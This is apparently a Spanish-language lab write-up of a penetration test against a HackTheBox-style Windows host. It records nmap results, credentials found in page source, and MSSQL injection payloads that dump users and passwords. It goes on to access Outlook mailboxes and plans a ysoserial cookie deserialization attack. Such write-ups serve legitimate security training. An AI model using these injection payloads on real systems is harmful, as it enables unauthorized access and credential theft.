#Advanced-Labs #Nota #tecnicas 

### Ping

```python
ping -c 1 10.13.37.12
PING 10.13.37.12 (10.13.37.12) 56(84) bytes of data.
64 bytes from 10.13.37.12: icmp_seq=1 ttl=127 time=96.2 ms

--- 10.13.37.12 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 96.183/96.183/96.183/0.000 ms
```

### TTL = 127 Windows

### nmap

```python
Nmap scan report for 10.13.37.12
Host is up (0.089s latency).
Not shown: 65531 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE       VERSION
443/tcp  open  ssl/https
|_http-title: Home page - Home
|_http-server-header: Microsoft-IIS/10.0
| ssl-cert: Subject: commonName=WMSvc-SHA2-WEB
| Not valid before: 2020-10-12T18:31:49
|_Not valid after:  2030-10-10T18:31:49
1433/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2070.00; GDR1
| ms-sql-info: 
|   10.13.37.12:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 GDR1
|       number: 15.00.2070.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: GDR1
|       Post-SP patches applied: false
|_    TCP port: 1433
| ms-sql-ntlm-info: 
|   10.13.37.12:1433: 
|     Target_Name: TEIGNTON
|     NetBIOS_Domain_Name: TEIGNTON
|     NetBIOS_Computer_Name: WEB
|     DNS_Domain_Name: TEIGNTON.HTB
|     DNS_Computer_Name: WEB.TEIGNTON.HTB
|     DNS_Tree_Name: TEIGNTON.HTB
|_    Product_Version: 10.0.17763
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=WEB.TEIGNTON.HTB
| Not valid before: 2024-06-12T13:37:50
|_Not valid after:  2024-12-12T13:37:50
| rdp-ntlm-info: 
|   Target_Name: TEIGNTON
|   NetBIOS_Domain_Name: TEIGNTON
|   NetBIOS_Computer_Name: WEB
|   DNS_Domain_Name: TEIGNTON.HTB
|   DNS_Computer_Name: WEB.TEIGNTON.HTB
|   DNS_Tree_Name: TEIGNTON.HTB
|   Product_Version: 10.0.17763
|_  System_Time: 2024-07-14T16:57:50+00:00
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 44s, deviation: 0s, median: 44s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 101.83 seconds
```

### Enumeración del puerto 80 (http)
El puerto `443/tcp` está abierto, y tiene corriendo el servicio `open ssl` es decir que es una `web https`.
parece que tenemos muchas cosas aquí. debemos hacer una enumeración mas a fundo de esta web
![[Pasted image 20240714130314.png]]

si vamos al apartado de staff y analizamos el código fuente podemos encontrar la primera flag y también podemos ver unas credenciales
![[Pasted image 20240714130420.png]]

### admin
aquí vamos a probar las credenciales que hemos conseguido 
![[Pasted image 20240714132229.png]]

### SQLI
después de logearnos podemos ver el apartado de management y lo primero que vemos es una especie de petición a una base de datos asi que probamos directamente una `SQLI` y obtenemos información del primer parámetro `weapp`  

```python
'+(select db_name())+'
```

![[Pasted image 20240714132403.png]]

### Enumeración de la base de datos

```python
'+(select name from webapp..sysobjects where xtype = 'U' order by name offset 1 rows fetch next 1 rows only)+'
```

en esta enumeración podemos ver que existe una tabla que se llama `users`
![[Pasted image 20240714132734.png]]

`dumpeamos el campo users`
```python
'+(select top 1 username from users order by username)+'
```

![[Pasted image 20240714133051.png]]

`dumpeamos el campo password`
```python
'+(select top 1 password from users order by username)+'
```

![[Pasted image 20240714133156.png]]

`haciendo muchas pruebas y peticiones logramos conseguir una flag`
```python
'+(select password from users order by username offset 2 rows fetch next 1 rows only)+'
```

![[Pasted image 20240714133355.png]]

### Fuzzing con wfuzz
haciendo Fuzzing encontramos un directorio llamado owa
![[Pasted image 20240714133924.png]]

### owa
en este directorio tenemos una web de `Outlook` en la cual obviamente vamos a probar las credenciales que hemos conseguido
![[Pasted image 20240714134042.png]]

### Outlook
haciendo uso de las credenciales que hemos conseguimos podemos hacer un inicio de sesión en Outlook
![[Pasted image 20240714134318.png]]

### open another mail box
vamos a intentar ingresar a otro mail y buscamos el del usuario admin
![[Pasted image 20240714144522.png]]

### jay teignton
descubrimos un correo enviado y tenemos un archivo.zip que vamos a descargar
![[Pasted image 20240714144626.png]]

### Deseralización de cookies
viendo esto puedo pensar el realizar una Deseralización de las cookies del perfil. para ello necesitaremos una herramienta que se llama ysoserial que esta para Windows así que vamos a necesitar una maquina Windows para este paso
![[Pasted image 20240714145130.png]]














### Vulnerabilidades

| CVE-XXXX-XXXXX | Nombre de la vulnerabilidad | Tipo | Nivel | Link |
| -------------- | --------------------------- | ---- | ----- | ---- |
|                |                             |      |       |      |
|                |                             |      |       |      |
|                |                             |      |       |      |
